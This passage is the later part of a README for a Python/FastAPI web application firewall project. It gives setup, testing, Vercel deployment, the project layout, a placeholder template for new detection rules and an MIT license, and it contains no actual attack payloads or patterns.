| **No ops** | Zero servers, patches, or uptime monitoring required |
| **Free tier** | Fully operable on Vercel's hobby plan |

### Environment Variables

```bash
# .env (local development)
ADMIN_SECRET_KEY=your-secret-key-here   # X-Admin-Key validation value
WAF_RATE_LIMIT=100                       # Requests per minute per IP
WAF_MODE=enforce                         # enforce | monitor | disabled
LOG_LEVEL=INFO                           # DEBUG | INFO | WARNING | ERROR
```

---

## Getting Started

### Prerequisites

```
Python  ≥ 3.11
Node.js ≥ 18.x  (for Astro frontend only)
pip     ≥ 23.x
```

### 1. Clone the Repository

```bash
git clone https://github.com/obstinix/outloop-waf.git
cd outloop-waf
```

### 2. Set Up Python Environment

```bash
# Create and activate virtual environment
python -m venv venv

# Linux / macOS
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### 3. Install Dependencies

```bash
pip install -r requirements.txt
```

### 4. Configure Environment

```bash
cp .env.example .env
# Edit .env with your ADMIN_SECRET_KEY and preferred settings
```

### 5. Run the Development Server

```bash
python -m uvicorn api.index:app --reload --port 8000
```

### 6. Access the Dashboard

```
SOC Dashboard     →  http://localhost:8000
Swagger API Docs  →  http://localhost:8000/api/docs
ReDoc             →  http://localhost:8000/api/redoc
Health Check      →  http://localhost:8000/api/health
```

### 7. Run the Test Suite

```bash
pytest -v
```

Expected output:

```
tests/test_health.py          ✓  6 passed
tests/test_waf.py             ✓ 21 passed
tests/test_antigravity.py     ✓ 13 passed
──────────────────────────────────────────
TOTAL                         ✓ 40 passed in 1.23s
```

### 8. Deploy to Vercel

```bash
npm install -g vercel
vercel login
vercel --prod
```

> **Note:** Ensure your environment variables (`ADMIN_SECRET_KEY`, etc.) are set in the Vercel project dashboard under **Settings → Environment Variables** before deploying to production.

---

## Project Structure

```
outloop-waf/
├── api/
│   ├── index.py                 # FastAPI application entry point
│   ├── static/
│   │   └── index.html           # SOC Dashboard (Three.js + SSE client)
│   ├── waf/
│   │   ├── middleware.py        # BaseHTTPMiddleware — request interception
│   │   ├── rules.py             # 57 signature definitions (regex + severity)
│   │   └── engine.py           # Threat analysis core (multi-pass decode + match)
│   ├── routes/
│   │   ├── health.py            # /api/health, /api/ready, /api/metrics
│   │   ├── secure.py            # /api/secure/test, /api/secure/echo
│   │   └── gravity.py           # /api/status (engine status)
│   └── utils/
│       └── logger.py            # Structured JSON logging
├── frontend/                    # Astro documentation layer
├── tests/
│   ├── test_health.py           # 6 health endpoint tests
│   ├── test_waf.py              # 21 WAF engine tests (attack payloads)
│   └── test_antigravity.py      # 13 route and status tests
├── .gitignore
├── LICENSE                      # MIT License
├── README.md
├── pytest.ini                   # Pytest configuration
├── requirements.txt             # Python dependencies
└── vercel.json                  # Serverless routing configuration
```

---

## Contributing

Contributions are welcome. Please follow these steps:

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feat/your-feature-name`
3. **Write tests** for your changes in the `tests/` directory
4. **Ensure all tests pass**: `pytest -v`
5. **Commit** with conventional commit messages: `git commit -m "feat(waf): add SSRF metadata rule"`
6. **Push** and open a **Pull Request** against `main`

### Adding New WAF Rules

New signatures are added to `api/waf/rules.py`. Each rule must include:

```python
{
    "id": "CATEGORY-NNN",        # e.g. SQLi-014
    "name": "Human readable name",
    "severity": "CRITICAL",       # CRITICAL | HIGH | MEDIUM | LOW
    "pattern": r"your_regex_here",
    "description": "What this detects and why"
}
```

> **Important:** All new patterns must have corresponding pytest tests in `tests/test_waf.py` with at least one positive (blocked) and one negative (clean) test case.

---

## License

```
MIT License

Copyright (c) 2026 obstinix (Piyush Pandey)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
```

See [LICENSE](LICENSE) for the full text.

---

<div align="center">

**OUTLOOP WAF** · Security Engine v1.0.0 · MIT License © 2026 [obstinix](https://github.com/obstinix)

Python · FastAPI · Vercel · Zero-config perimeter protection

[![Live Demo](https://img.shields.io/badge/🌐%20Live%20Demo-outloop--waf.vercel.app-00d4ff?style=flat-square&labelColor=0a0a0a)](https://outloop-waf.vercel.app)
[![GitHub](https://img.shields.io/badge/GitHub-obstinix%2Foutloop--waf-181717?style=flat-square&logo=github)](https://github.com/obstinix/outloop-waf)

*Built with intent. Protected with precision.*

</div>
